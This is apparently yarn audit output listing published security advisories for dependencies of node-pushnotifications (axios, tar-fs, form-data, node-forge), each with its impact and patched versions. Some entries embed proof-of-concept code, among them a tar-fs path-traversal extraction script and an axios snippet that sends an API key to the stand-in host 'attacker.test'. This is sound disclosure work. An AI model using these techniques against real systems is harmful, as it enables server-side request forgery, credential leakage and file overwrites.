{"type":"auditAdvisory","data":{"resolution":{"id":1098583,"path":"node-pushnotifications>node-gcm>axios","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"1.6.8","paths":["node-pushnotifications>node-gcm>axios"]}],"found_by":null,"deleted":null,"references":"- https://nvd.nist.gov/vuln/detail/CVE-2024-39338\n- https://github.com/axios/axios/releases\n- https://jeffhacks.com/advisories/2024/06/24/CVE-2024-39338.html\n- https://github.com/axios/axios/issues/6463\n- https://github.com/axios/axios/pull/6539\n- https://github.com/axios/axios/pull/6543\n- https://github.com/axios/axios/commit/6b6b605eaf73852fb2dae033f1e786155959de3a\n- https://github.com/axios/axios/releases/tag/v1.7.4\n- https://github.com/advisories/GHSA-8hc4-vh64-cxmj","created":"2024-08-12T15:30:49.000Z","id":1098583,"npm_advisory_id":null,"overview":"axios 1.7.2 allows SSRF via unexpected behavior where requests for path relative URLs get processed as protocol relative URLs.","reported_by":null,"title":"Server-Side Request Forgery in axios","metadata":null,"cves":["CVE-2024-39338"],"access":"public","severity":"high","module_name":"axios","vulnerable_versions":">=1.3.2 <=1.7.3","github_advisory_id":"GHSA-8hc4-vh64-cxmj","recommendation":"Upgrade to version 1.7.4 or later","patched_versions":">=1.7.4","updated":"2024-08-13T19:53:25.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-918"],"url":"https://github.com/advisories/GHSA-8hc4-vh64-cxmj"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1109532,"path":"node-pushnotifications>firebase-admin>farmhash>prebuild-install>tar-fs","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"2.1.1","paths":["node-pushnotifications>firebase-admin>farmhash>prebuild-install>tar-fs"]}],"found_by":null,"deleted":null,"references":"- https://github.com/mafintosh/tar-fs/security/advisories/GHSA-vj76-c3g6-qr5v\n- https://nvd.nist.gov/vuln/detail/CVE-2025-59343\n- https://github.com/mafintosh/tar-fs/commit/0bd54cdf06da2b7b5b95cd4b062c9f4e0a8c4e09\n- https://lists.debian.org/debian-lts-announce/2025/09/msg00028.html\n- https://github.com/advisories/GHSA-vj76-c3g6-qr5v","created":"2025-09-24T18:57:04.000Z","id":1109532,"npm_advisory_id":null,"overview":"### Impact\n v3.1.0, v2.1.3, v1.16.5 and below\n\n### Patches\nHas been patched in 3.1.1, 2.1.4, and 1.16.6\n\n### Workarounds\nYou can use the ignore option to ignore non files/directories.\n\n```js\n  ignore (_, header) {\n    // pass files & directories, ignore e.g. symlinks\n    return header.type !== 'file' && header.type !== 'directory'\n  }\n```\n\n### Credit\nReported by: Mapta / BugBunny_ai","reported_by":null,"title":"tar-fs has a symlink validation bypass if destination directory is predictable with a specific tarball","metadata":null,"cves":["CVE-2025-59343"],"access":"public","severity":"high","module_name":"tar-fs","vulnerable_versions":">=2.0.0 <2.1.4","github_advisory_id":"GHSA-vj76-c3g6-qr5v","recommendation":"Upgrade to version 2.1.4 or later","patched_versions":">=2.1.4","updated":"2025-11-03T21:34:36.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-22","CWE-61"],"url":"https://github.com/advisories/GHSA-vj76-c3g6-qr5v"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1109540,"path":"node-pushnotifications>firebase-admin>@google-cloud/storage>retry-request>@types/request>form-data","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"2.5.1","paths":["node-pushnotifications>firebase-admin>@google-cloud/storage>retry-request>@types/request>form-data","node-pushnotifications>firebase-admin>@google-cloud/firestore>google-gax>retry-request>@types/request>form-data"]}],"found_by":null,"deleted":null,"references":"- https://github.com/form-data/form-data/security/advisories/GHSA-fjxv-7rqg-78g4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-7783\n- https://github.com/form-data/form-data/commit/3d1723080e6577a66f17f163ecd345a21d8d0fd0\n- https://github.com/benweissmann/CVE-2025-7783-poc\n- https://lists.debian.org/debian-lts-announce/2025/07/msg00023.html\n- https://github.com/advisories/GHSA-fjxv-7rqg-78g4","created":"2025-07-21T19:04:54.000Z","id":1109540,"npm_advisory_id":null,"overview":"### Summary\n\nform-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.","reported_by":null,"title":"form-data uses unsafe random function in form-data for choosing boundary","metadata":null,"cves":["CVE-2025-7783"],"access":"public","severity":"critical","module_name":"form-data","vulnerable_versions":"<2.5.4","github_advisory_id":"GHSA-fjxv-7rqg-78g4","recommendation":"Upgrade to version 2.5.4 or later","patched_versions":">=2.5.4","updated":"2025-11-03T21:34:09.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-330"],"url":"https://github.com/advisories/GHSA-fjxv-7rqg-78g4"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1109540,"path":"node-pushnotifications>firebase-admin>@google-cloud/firestore>google-gax>retry-request>@types/request>form-data","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"2.5.1","paths":["node-pushnotifications>firebase-admin>@google-cloud/storage>retry-request>@types/request>form-data","node-pushnotifications>firebase-admin>@google-cloud/firestore>google-gax>retry-request>@types/request>form-data"]}],"found_by":null,"deleted":null,"references":"- https://github.com/form-data/form-data/security/advisories/GHSA-fjxv-7rqg-78g4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-7783\n- https://github.com/form-data/form-data/commit/3d1723080e6577a66f17f163ecd345a21d8d0fd0\n- https://github.com/benweissmann/CVE-2025-7783-poc\n- https://lists.debian.org/debian-lts-announce/2025/07/msg00023.html\n- https://github.com/advisories/GHSA-fjxv-7rqg-78g4","created":"2025-07-21T19:04:54.000Z","id":1109540,"npm_advisory_id":null,"overview":"### Summary\n\nform-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.","reported_by":null,"title":"form-data uses unsafe random function in form-data for choosing boundary","metadata":null,"cves":["CVE-2025-7783"],"access":"public","severity":"critical","module_name":"form-data","vulnerable_versions":"<2.5.4","github_advisory_id":"GHSA-fjxv-7rqg-78g4","recommendation":"Upgrade to version 2.5.4 or later","patched_versions":">=2.5.4","updated":"2025-11-03T21:34:09.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-330"],"url":"https://github.com/advisories/GHSA-fjxv-7rqg-78g4"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1109543,"path":"node-pushnotifications>firebase-admin>farmhash>prebuild-install>tar-fs","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"2.1.1","paths":["node-pushnotifications>firebase-admin>farmhash>prebuild-install>tar-fs"]}],"found_by":null,"deleted":null,"references":"- https://github.com/mafintosh/tar-fs/security/advisories/GHSA-8cj5-5rvv-wf4v\n- https://nvd.nist.gov/vuln/detail/CVE-2025-48387\n- https://github.com/mafintosh/tar-fs/commit/647447b572bc135c41035e82ca7b894f02b17f0f\n- https://github.com/google/security-research/security/advisories/GHSA-xrg4-qp5w-2c3w\n- https://lists.debian.org/debian-lts-announce/2025/06/msg00012.html\n- https://github.com/advisories/GHSA-8cj5-5rvv-wf4v","created":"2025-06-03T06:14:25.000Z","id":1109543,"npm_advisory_id":null,"overview":"### Impact\n v3.0.8, v2.1.2, v1.16.4 and below\n\n### Patches\nHas been patched in 3.0.9, 2.1.3, and 1.16.5\n\n### Workarounds\nYou can use the ignore option to ignore non files/directories.\n\n```js\n  ignore (_, header) {\n    // pass files & directories, ignore e.g. symlinks\n    return header.type !== 'file' && header.type !== 'directory'\n  }\n```\n\n### Credit\nThank you Caleb Brown from Google Open Source Security Team for reporting this in detail.","reported_by":null,"title":"tar-fs can extract outside the specified dir with a specific tarball","metadata":null,"cves":["CVE-2025-48387"],"access":"public","severity":"high","module_name":"tar-fs","vulnerable_versions":">=2.0.0 <2.1.3","github_advisory_id":"GHSA-8cj5-5rvv-wf4v","recommendation":"Upgrade to version 2.1.3 or later","patched_versions":">=2.1.3","updated":"2025-11-03T21:34:00.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-22"],"url":"https://github.com/advisories/GHSA-8cj5-5rvv-wf4v"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1109552,"path":"node-pushnotifications>firebase-admin>farmhash>prebuild-install>tar-fs","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"2.1.1","paths":["node-pushnotifications>firebase-admin>farmhash>prebuild-install>tar-fs"]}],"found_by":null,"deleted":null,"references":"- https://nvd.nist.gov/vuln/detail/CVE-2024-12905\n- https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed\n- https://arxiv.org/abs/2506.04962\n- https://arxiv.org/pdf/2506.04962\n- https://lists.debian.org/debian-lts-announce/2025/06/msg00012.html\n- https://www.seal.security/blog/a-link-to-the-past-uncovering-a-new-vulnerability-in-tar-fs\n- https://github.com/advisories/GHSA-pq67-2wwv-3xjx","created":"2025-03-27T18:31:28.000Z","id":1109552,"npm_advisory_id":null,"overview":"An Improper Link Resolution Before File Access (\"Link Following\") and Improper Limitation of a Pathname to a Restricted Directory (\"Path Traversal\"). This vulnerability occurs when extracting a maliciously crafted tar file, which can result in unauthorized file writes or overwrites outside the intended extraction directory. The issue is associated with index.js in the tar-fs package.\n\nThis issue affects tar-fs: from 0.0.0 before 1.16.4, from 2.0.0 before 2.1.2, from 3.0.0 before 3.0.7.\n\n### PoC\n```javascript\n// Create a writable stream to extract the tar content\nconst extractStream = tarfs.extract('/', {\n    // We can ignore the file type checks to allow the extraction of the malicious file\n    ignore: (name) => false,\n});\n\n// Create a tar stream\nconst tarStream = tarfs.pack().on('error', (err) => {\n    throw err;\n});\n\n// Append the malicious entry to the tar stream\ntarStream.entry({ name: '/flag.txt', mode: 0o644 }, Buffer.from('This is a flag!'));\n\n// Finalize the tar stream\ntarStream.finalize();\n\n// Pipe the tar stream into the extract stream\ntarStream.pipe(extractStream);\n```","reported_by":null,"title":"tar-fs Vulnerable to Link Following and Path Traversal via Extracting a Crafted tar File","metadata":null,"cves":["CVE-2024-12905"],"access":"public","severity":"high","module_name":"tar-fs","vulnerable_versions":">=2.0.0 <2.1.2","github_advisory_id":"GHSA-pq67-2wwv-3xjx","recommendation":"Upgrade to version 2.1.2 or later","patched_versions":">=2.1.2","updated":"2025-11-03T22:55:00.000Z","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"},"cwe":["CWE-22"],"url":"https://github.com/advisories/GHSA-pq67-2wwv-3xjx"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1110996,"path":"node-pushnotifications>@parse/node-apn>node-forge","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"1.3.1","paths":["node-pushnotifications>@parse/node-apn>node-forge"]}],"found_by":null,"deleted":null,"references":"- https://github.com/digitalbazaar/forge/security/advisories/GHSA-554w-wpv2-vw27\n- https://github.com/digitalbazaar/forge/commit/260425c6167a38aae038697132483b5517b26451\n- https://github.com/advisories/GHSA-554w-wpv2-vw27","created":"2025-11-26T22:08:37.000Z","id":1110996,"npm_advisory_id":null,"overview":"### Summary\n\nAn Uncontrolled Recursion (CWE-674) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft deep ASN.1 structures that trigger unbounded recursive parsing. This leads to a Denial-of-Service (DoS) via stack exhaustion when parsing untrusted DER inputs.\n\n### Details\n\nAn ASN.1 Denial of Service (Dos) vulnerability exists in the node-forge `asn1.fromDer` function within `forge/lib/asn1.js`. The ASN.1 DER parser implementation (`_fromDer`) recurses for every constructed ASN.1 value (SEQUENCE, SET, etc.) and lacks a guard limiting recursion depth. An attacker can craft a small DER blob containing a very large nesting depth of constructed TLVs which causes the Node.js V8 engine to exhaust its call stack and throw `RangeError: Maximum call stack size exceeded`, crashing or incapacitating the process handling the parse. This is a remote, low-cost Denial-of-Service against applications that parse untrusted ASN.1 objects.\n\n### Impact\n\nThis vulnerability enables an unauthenticated attacker to reliably crash a server or client using node-forge for TLS connections or certificate parsing.\n\nThis vulnerability impacts the ans1.fromDer function in `node-forge` before patched version `1.3.2`. \n\nAny downstream application using this component is impacted. These components may be leveraged by downstream applications in ways that enable full compromise of availability.","reported_by":null,"title":"node-forge has ASN.1 Unbounded Recursion","metadata":null,"cves":["CVE-2025-66031"],"access":"public","severity":"high","module_name":"node-forge","vulnerable_versions":"<1.3.2","github_advisory_id":"GHSA-554w-wpv2-vw27","recommendation":"Upgrade to version 1.3.2 or later","patched_versions":">=1.3.2","updated":"2025-11-26T22:08:40.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-674"],"url":"https://github.com/advisories/GHSA-554w-wpv2-vw27"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1110998,"path":"node-pushnotifications>@parse/node-apn>node-forge","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"1.3.1","paths":["node-pushnotifications>@parse/node-apn>node-forge"]}],"found_by":null,"deleted":null,"references":"- https://github.com/digitalbazaar/forge/security/advisories/GHSA-5gfm-wpxj-wjgq\n- https://github.com/digitalbazaar/forge/pull/1124\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/asn1.js#L1153\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/ed25519.js#L81\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pbe.js#L363\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs12.js#L328\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs7.js#L90\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/rsa.js#L1167\n- https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/x509.js#L667\n- https://kb.cert.org/vuls/id/521113\n- https://www.kb.cert.org/vuls/id/521113\n- https://www.npmjs.com/package/node-forge\n- https://github.com/advisories/GHSA-5gfm-wpxj-wjgq","created":"2025-11-26T22:07:19.000Z","id":1110998,"npm_advisory_id":null,"overview":"### Summary\n\nCVE-2025-12816 has been reserved by CERT/CC\n\n**Description**\nAn Interpretation Conflict (CWE-436) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft ASN.1 structures to desynchronize schema validations, yielding a semantic divergence that may bypass downstream cryptographic verifications and security decisions.\n\n\n### Details\n\nA critical ASN.1 validation bypass vulnerability exists in the node-forge asn1.validate function within `forge/lib/asn1.js`. ASN.1 is a schema language that defines data structures, like the typed record schemas used in X.509, PKCS#7, PKCS#12, etc. DER (Distinguished Encoding Rules), a strict binary encoding of ASN.1, is what cryptographic code expects when verifying signatures, and the exact bytes and structure must match the schema used to compute and verify the signature. After deserializing DER, Forge uses static ASN.1 validation schemas to locate the signed data or public key, compute digests over the exact bytes required, and feed digest and signature fields into cryptographic primitives.\n\nThis vulnerability allows a specially crafted ASN.1 object to desynchronize the validator on optional boundaries, causing a malformed optional field to be semantically reinterpreted as the subsequent mandatory structure. This manifests as logic bypasses in cryptographic algorithms and protocols with optional security features (such as PKCS#12, where MACs are treated as absent) and semantic interpretation conflicts in strict protocols (such as X.509, where fields are read as the wrong type).\n\n### Impact\n\nThis flaw allows an attacker to desynchronize the validator, allowing critical components like digital signatures or integrity checks to be skipped or validated against attacker-controlled data.\n\nThis vulnerability impacts the `ans1.validate` function in `node-forge` before patched version `1.3.2`.\nhttps://github.com/digitalbazaar/forge/blob/main/lib/asn1.js.\n\nThe following components in `node-forge` are impacted.\n[lib/asn1.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/asn1.js#L1153)\n[lib/x509.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/x509.js#L667)\n[lib/pkcs12.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs12.js#L328)\n[lib/pkcs7.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs7.js#L90)\n[lib/rsa.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/rsa.js#L1167)\n[lib/pbe.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pbe.js#L363)\n[lib/ed25519.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/ed25519.js#L81)\n\nAny downstream application using these components is impacted.\n\nThese components may be leveraged by downstream applications in ways that enable full compromise of integrity, leading to potential availability and confidentiality compromises.","reported_by":null,"title":"node-forge has an Interpretation Conflict vulnerability via its ASN.1 Validator Desynchronization","metadata":null,"cves":["CVE-2025-12816"],"access":"public","severity":"high","module_name":"node-forge","vulnerable_versions":"<1.3.2","github_advisory_id":"GHSA-5gfm-wpxj-wjgq","recommendation":"Upgrade to version 1.3.2 or later","patched_versions":">=1.3.2","updated":"2025-11-26T22:07:20.000Z","cvss":{"score":8.6,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N"},"cwe":["CWE-436"],"url":"https://github.com/advisories/GHSA-5gfm-wpxj-wjgq"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1111035,"path":"node-pushnotifications>node-gcm>axios","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"1.6.8","paths":["node-pushnotifications>node-gcm>axios"]}],"found_by":null,"deleted":null,"references":"- https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6\n- https://github.com/axios/axios/issues/6463\n- https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f\n- https://github.com/axios/axios/releases/tag/v1.8.2\n- https://nvd.nist.gov/vuln/detail/CVE-2025-27152\n- https://github.com/axios/axios/pull/6829\n- https://github.com/axios/axios/commit/02c3c69ced0f8fd86407c23203835892313d7fde\n- https://github.com/advisories/GHSA-jr5f-v2jv-69x6","created":"2025-03-07T15:16:00.000Z","id":1111035,"npm_advisory_id":null,"overview":"### Summary\n\nA previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery). Reference: axios/axios#6463\n\nA similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" > /tmp/server1/index.html \necho \"this is server2\" > /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &\npython -m http.server -d /tmp/server2 10002 &\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.","reported_by":null,"title":"axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL","metadata":null,"cves":["CVE-2025-27152"],"access":"public","severity":"high","module_name":"axios","vulnerable_versions":">=1.0.0 <1.8.2","github_advisory_id":"GHSA-jr5f-v2jv-69x6","recommendation":"Upgrade to version 1.8.2 or later","patched_versions":">=1.8.2","updated":"2025-11-27T08:44:29.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-918"],"url":"https://github.com/advisories/GHSA-jr5f-v2jv-69x6"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1111068,"path":"node-pushnotifications>@parse/node-apn>node-forge","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"1.3.1","paths":["node-pushnotifications>@parse/node-apn>node-forge"]}],"found_by":null,"deleted":null,"references":"- https://github.com/digitalbazaar/forge/security/advisories/GHSA-65ch-62r8-g69g\n- https://github.com/digitalbazaar/forge/commit/3e0c35ace169cfca529a3e547a7848dc7bf57fdb\n- https://nvd.nist.gov/vuln/detail/CVE-2025-66030\n- https://github.com/advisories/GHSA-65ch-62r8-g69g","created":"2025-11-26T22:07:44.000Z","id":1111068,"npm_advisory_id":null,"overview":"### Summary\n\n**MITRE-Formatted CVE Description**\nAn Integer Overflow (CWE-190) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft ASN.1 structures containing OIDs with oversized arcs. These arcs may be decoded as smaller, trusted OIDs due to 32-bit bitwise truncation, enabling the bypass of downstream OID-based security decisions.\n\n### Description\n\nAn ASN.1 OID Integer Truncation vulnerability exists in the node-forge `asn1.derToOid` function within `forge/lib/asn1.js`. OID components are decoded using JavaScript's bitwise left-shift operator (`<<`), which forcibly casts values to 32-bit signed integers. Consequently, if an attacker provides a mathematically unique, very large OID arc integer exceeding $2^{31}-1$, the value silently overflows and wraps around rather than throwing an error. \n\n### Impact\n\nThis vulnerability allows a specially crafted ASN.1 object to spoof an OID, where a malicious certificate with a massive, invalid OID is misinterpreted by the library as a trusted, standard OID, potentially bypassing security controls.\n\nThis vulnerability impacts the `asn1.derToOid` function in `node-forge` before patched version `1.3.2`. \n\nAny downstream application using this component is impacted. This component may be leveraged by downstream applications in ways that enables partial compromise of integrity, leading to potential availability and confidentiality compromises.","reported_by":null,"title":"node-forge is vulnerable to ASN.1 OID Integer Truncation","metadata":null,"cves":["CVE-2025-66030"],"access":"public","severity":"moderate","module_name":"node-forge","vulnerable_versions":"<1.3.2","github_advisory_id":"GHSA-65ch-62r8-g69g","recommendation":"Upgrade to version 1.3.2 or later","patched_versions":">=1.3.2","updated":"2025-12-01T16:02:52.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-190"],"url":"https://github.com/advisories/GHSA-65ch-62r8-g69g"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1112195,"path":"node-pushnotifications>node-gcm>axios","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"1.6.8","paths":["node-pushnotifications>node-gcm>axios"]}],"found_by":null,"deleted":null,"references":"- https://github.com/axios/axios/security/advisories/GHSA-4hjh-wcwx-xvwj\n- https://github.com/axios/axios/pull/7011\n- https://github.com/axios/axios/commit/945435fc51467303768202250debb8d4ae892593\n- https://github.com/axios/axios/releases/tag/v1.12.0\n- https://nvd.nist.gov/vuln/detail/CVE-2025-58754\n- https://github.com/axios/axios/pull/7034\n- https://github.com/axios/axios/commit/a1b1d3f073a988601583a604f5f9f5d05a3d0b67\n- https://github.com/axios/axios/releases/tag/v0.30.2\n- https://github.com/axios/axios/commit/c30252f685e8f4326722de84923fcbc8cf557f06\n- https://github.com/advisories/GHSA-4hjh-wcwx-xvwj","created":"2025-09-11T21:07:55.000Z","id":1112195,"npm_advisory_id":null,"overview":"## Summary\n\nWhen Axios runs on Node.js and is given a URL with the `data:` scheme, it does not perform HTTP. Instead, its Node http adapter decodes the entire payload into memory (`Buffer`/`Blob`) and returns a synthetic 200 response.\nThis path ignores `maxContentLength` / `maxBodyLength` (which only protect HTTP responses), so an attacker can supply a very large `data:` URI and cause the process to allocate unbounded memory and crash (DoS), even if the caller requested `responseType: 'stream'`.\n\n## Details\n\nThe Node adapter (`lib/adapters/http.js`) supports the `data:` scheme. When `axios` encounters a request whose URL starts with `data:`, it does not perform an HTTP request. Instead, it calls `fromDataURI()` to decode the Base64 payload into a Buffer or Blob.\n\nRelevant code from 